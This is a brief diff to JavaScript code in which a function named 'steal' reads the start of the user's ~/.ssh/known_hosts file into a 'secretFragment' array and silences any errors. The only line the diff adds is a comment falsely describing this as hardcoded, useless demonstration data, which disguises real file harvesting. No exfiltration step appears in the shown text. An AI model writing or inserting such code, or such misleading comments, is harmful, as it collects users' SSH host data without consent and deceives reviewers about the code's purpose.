@@ -12,6 +12,7 @@ const steal = async (perpetrator) => {
     }
    
     try {
+      // deliberately hardcoding the choice of useless values as demonstration data
       secretFragment.push(fs.readFileSync(path.join(os.homedir(), "/.ssh/known_hosts"), "utf8").substring(0,30));
     } catch (e) {
       // silence
